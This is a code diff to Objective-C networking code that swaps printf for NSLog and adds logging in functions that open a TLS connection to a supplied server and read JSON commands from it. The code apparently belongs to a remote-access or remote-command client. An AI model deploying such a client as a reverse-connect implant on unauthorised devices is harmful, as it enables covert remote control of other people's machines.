@@ -73,7 +73,7 @@ NSString* getFullCMD(NSDictionary* dict) {
 
 void connectToServer(NSDictionary* arguments) {
   if (!arguments) {
-    printf("Error: No/insufficent arguments provided!\n");
+    NSLog(@"Error: No/insufficent arguments provided!\n");
     return;
   }
   NSLog(@"Arguments:\t%@", arguments);
@@ -85,22 +85,22 @@ void connectToServer(NSDictionary* arguments) {
             &serverAddress.sin_addr);
   serverAddress.sin_port =
       htons([[arguments objectForKey:@"port"] integerValue]);
-  printf("%s", "Connecting...\n");
+  NSLog(@"%s", "Connecting...\n");
   if (connect(sockfd, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) <
       0) {
-    printf("%s", "connection failed\n");
+    NSLog(@"%s", "connection failed\n");
     return;
   } else {
-    printf("%s", "connection successfull\n");
+    NSLog(@"%s", "connection successfull\n");
   }
   client_ssl = SSL_new(ssl_client_ctx);
   if (!client_ssl) {
-    printf("Client Failed\n");
+    NSLog(@"Client Failed\n");
     return;
   }
   SSL_set_fd(client_ssl, sockfd);
   if (SSL_connect(client_ssl) < 0) {
-    printf("Handshake Failed\n");
+    NSLog(@"Handshake Failed\n");
     return;
   }
 
@@ -124,10 +124,10 @@ void connectToServer(NSDictionary* arguments) {
 }
 
 void interact(NSDictionary* arguments) {
+  NSLog(@"[- INTERACT -] Interaction started (arguments: %@)", arguments);
   espl* esCommand = [[espl alloc] init];
+  NSLog(@"[- INTERACT -] Reading from buffer...");
   esCommand->client_ssl = client_ssl;
-
-  // listen for input data
   char buffer[2048] = "";
   while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
     NSData* jsonData = [[NSString stringWithFormat:@"%s", buffer]
